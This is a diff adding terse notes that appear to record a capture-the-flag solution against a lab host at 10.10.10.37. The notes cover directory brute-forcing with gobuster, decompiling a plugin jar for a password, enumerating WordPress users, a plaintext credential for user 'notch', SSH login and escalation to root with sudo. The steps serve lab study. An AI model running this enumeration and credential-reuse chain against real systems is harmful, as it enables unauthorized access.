@@ -1,0 +1,7 @@
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.37
+http://10.10.10.37/plugins/
+BlockyCore.jar -> JDGUI pass
+wpscan --url http://10.10.10.37/ -e u
+notch : 8YsqfCTnvxAUeduzjNSXe22
+ssh notch@10.10.10.37
+sudo su
